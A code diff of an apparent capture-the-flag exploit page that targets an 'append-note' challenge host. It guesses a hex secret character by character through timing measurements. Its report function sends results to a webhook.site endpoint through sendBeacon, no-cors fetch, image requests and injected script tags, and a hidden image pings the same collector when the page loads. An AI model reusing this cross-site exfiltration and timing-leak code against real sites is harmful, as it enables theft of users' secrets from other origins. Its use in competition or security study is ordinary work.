@@ -15,11 +15,11 @@ body { background: #0d1117; color: #c9d1d9; font-family: monospace; padding: 16p
 <body>
 <div id="status">Starting...</div>
 <div id="log"></div>
-<img alt="" style="display:none" src="https://webhook.site/be20a600-dc6c-4737-986a-a086fbed8298?boot=1&t=static">
+<img alt="" style="display:none" src="https://webhook.site/5a71a1f0-201a-455f-8ca1-02f890c6f5e9?boot=1&t=static">
 
 <script>
 const TARGET = "https://append-note-3npey.instancer.lac.tf";
-const WEBHOOK = "https://webhook.site/be20a600-dc6c-4737-986a-a086fbed8298";
+const WEBHOOK = "https://webhook.site/5a71a1f0-201a-455f-8ca1-02f890c6f5e9";
 const DEBUG_REDIRECT = false;
 const CHARS = "0123456789abcdef";
 
@@ -43,19 +43,14 @@ function report(msg) {
     const q = encodeURIComponent(msg);
     const t = Date.now();
     const url = WEBHOOK + "?d=" + q + "&t=" + t;
-    const send = () => {
-        try { navigator.sendBeacon(WEBHOOK, msg); } catch (e) {}
-        try { fetch(url + "&m=fetch", { mode: "no-cors", method: "GET" }); } catch (e) {}
-        try { (new Image()).src = url + "&m=img"; } catch (e) {}
-        try {
-            const s = document.createElement("script");
-            s.src = url + "&m=script";
-            document.head.appendChild(s);
-        } catch (e) {}
-    };
-    send();
-    setTimeout(send, 300);
-    setTimeout(send, 900);
+    try { navigator.sendBeacon(WEBHOOK, msg); } catch (e) {}
+    try { fetch(url + "&m=fetch", { mode: "no-cors", method: "GET" }); } catch (e) {}
+    try { (new Image()).src = url + "&m=img"; } catch (e) {}
+    try {
+        const s = document.createElement("script");
+        s.src = url + "&m=script";
+        document.head.appendChild(s);
+    } catch (e) {}
 }
 
 // Fire a single inline boot signal as early as possible
@@ -168,7 +163,7 @@ async function findSecret(matchFaster) {
         log(`Winner: ${winner.c} (d=${winner.d.toFixed(2)}ms)`, "warn");
 
         secret += winner.c;
-        report(`POS${pos}=${winner.c} SECRET=${secret}`);
+        // reduce webhook noise: skip per-position reports
     }
 
     return secret;
